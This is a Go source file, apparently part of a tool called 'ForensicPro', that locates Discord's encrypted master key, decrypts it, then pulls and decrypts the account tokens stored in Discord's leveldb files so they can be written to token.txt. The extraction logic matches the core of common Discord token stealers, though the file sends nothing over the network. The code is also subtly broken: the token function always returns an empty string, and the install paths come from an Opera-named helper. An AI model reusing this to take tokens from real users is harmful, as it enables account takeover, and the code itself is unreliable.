package Messengers

import (
	"ForensicPro/utils"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var DiscordPaths = map[string]string{
	"Discord":        utils.GetOperaPath("Discord"),
	"Discord PTB":    utils.GetOperaPath("DiscordPTB"),
	"Discord Canary": utils.GetOperaPath("DiscordCanary"),
}

func GetDiscordKey(path string) []byte {
	path2 := filepath.Join(path, "Local State")
	// 检查文件是否存在
	if _, err := os.Stat(path2); os.IsNotExist(err) {
		//fmt.Println("File does not exist:", path2)
		return nil
	}
	// 读取文件内容并去除空格
	content, err := ioutil.ReadFile(path2)
	if err != nil {
		//fmt.Println("Error reading file:", err)
		return nil
	}
	contentStr := bytes.ReplaceAll(content, []byte(" "), []byte{})

	// 定义正则表达式
	re := regexp.MustCompile(`"encrypted_key":"(.*?)"`)

	// 查找所有匹配项
	matches := re.FindAllStringSubmatch(string(contentStr), -1)

	var array []byte
	for _, match := range matches {
		if len(match) > 1 {
			// 解码 Base64 字符串
			decoded, err := base64.StdEncoding.DecodeString(match[1])
			if err != nil {
				fmt.Println("Error decoding Base64 string:", err)
				continue
			}
			array = decoded
		}
	}
	var array2 []byte
	// 创建新的数组并复制数据
	if len(array) > 5 {
		array2 = make([]byte, len(array)-5)
		copy(array2, array[5:])
		//fmt.Println("Resulting array:", array2)
	} else {
		fmt.Println("Array length is too short to perform the operation.")
	}
	decryptData, err := utils.DecryptData(array2)
	return decryptData
}

func GetToken(path string, key []byte) string {
	var builder strings.Builder
	// 构建目标路径
	targetPath := filepath.Join(path, "Local Storage", "leveldb")

	// 获取指定目录下匹配 *.l?? 的文件列表
	files, err := filepath.Glob(filepath.Join(targetPath, "*.l??"))
	if err != nil {
		fmt.Println("Error getting files:", err)
		return ""
	}

	// 打印文件列表
	for _, file := range files {
		input, _ := ioutil.ReadFile(file)
		if key == nil {
			return ""
		}
		// 定义正则表达式
		re := regexp.MustCompile(`dQw4w9WgXcQ:([^.*\\['(.*)'\\].*$][^\"]*)`)

		// 查找所有匹配项
		matches := re.FindAllStringSubmatch(string(input), -1)

		//var array []byte
		// 遍历匹配项
		for _, match := range matches {
			if len(match) > 1 {
				// 解码 Base64 字符串
				source, err := base64.StdEncoding.DecodeString(match[1])
				if err != nil {
					fmt.Println("Error decoding Base64 string:", err)
					continue
				}

				// 提取各个部分
				array := source[15:]
				iv := source[3:15]
				array2 := array[len(array)-16:]
				array = array[:len(array)-len(array2)]

				// 解密
				//aesGcm := &AesGcm{}
				//bytes, err := aesGcm.Decrypt(key, iv, nil, array, array2)
				block, err := aes.NewCipher(key)
				gcm, err := cipher.NewGCM(block)
				plaintext, err := gcm.Open(nil, iv, array, array2)

				if err != nil {
					fmt.Println("Error decrypting:", err)
					continue
				}

				// 转换为字符串
				builder.WriteString(string(plaintext) + "\n")
			}
		}
		//fmt.Println(file)
	}
	return ""
}
func DiscordSave(path string) {
	for Discord_key, Discord_value := range DiscordPaths {
		masterKey := GetDiscordKey(Discord_value)
		if masterKey != nil {
			token := GetToken(Discord_value, masterKey)
			if token != "" {
				//utils.WriteToFile()
				// 创建目标目录
				targetDir := filepath.Join(path, Discord_key)
				err := os.MkdirAll(targetDir, os.ModePerm)
				if err != nil {
					return
				}
				err = utils.WriteToFile(token, filepath.Join(targetDir, "token.txt"))
				if err != nil {
					return
				}

			}
		}
	}
	fmt.Println("Discord取证结束")

}
